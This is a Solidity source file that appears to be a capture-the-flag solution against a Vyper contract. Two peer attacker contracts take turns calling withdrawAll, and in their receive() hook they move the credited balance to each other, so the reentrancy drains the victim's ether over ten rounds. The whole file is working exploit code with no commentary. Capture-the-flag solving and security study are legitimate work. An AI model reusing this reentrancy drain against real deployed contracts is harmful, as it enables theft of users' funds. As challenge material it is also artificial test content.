// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IExampleCTFVy} from "src/interfaces/IExampleCTFVy.sol";

contract ExampleCTFVySolution {

    ExampleCTFVySolutionPeer immutable public solutionPeer1;
    ExampleCTFVySolutionPeer immutable public solutionPeer2;

    constructor(address victim) {
        solutionPeer1 = new ExampleCTFVySolutionPeer(victim);
        solutionPeer2 = new ExampleCTFVySolutionPeer(victim);

        solutionPeer1.setAttackPeer(solutionPeer2);
        solutionPeer2.setAttackPeer(solutionPeer1);
    }

    function solve() external payable {
        solutionPeer1.attackInit{value: msg.value}();

        for (uint256 i = 0; i < 10; i++) {
            if (i % 2 == 0) {
                solutionPeer2.attackNext();
            } else {
                solutionPeer1.attackNext();
            }
        }
    }
}

contract ExampleCTFVySolutionPeer {
    IExampleCTFVy public immutable vyperSecureumCTF;
    ExampleCTFVySolutionPeer public solutionPeer;

    constructor(address _vyperSecureumCTF) {
        vyperSecureumCTF = IExampleCTFVy(_vyperSecureumCTF);
    }

    function setAttackPeer(ExampleCTFVySolutionPeer _solutionPeer) external {
        solutionPeer = _solutionPeer;
    }
    
    receive() external payable {
        if (address(vyperSecureumCTF).balance >= 0.1 ether) {
            vyperSecureumCTF.transfer(
                address(solutionPeer), 
                vyperSecureumCTF.userBalances(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(
            msg.value == 0.1 ether,
            "Must send 0.1 Ether to trigger the attack"
        );
        vyperSecureumCTF.deposit{value: 0.1 ether}();
        vyperSecureumCTF.withdrawAll();
    }

    function attackNext() external {
        vyperSecureumCTF.withdrawAll();
    }

}
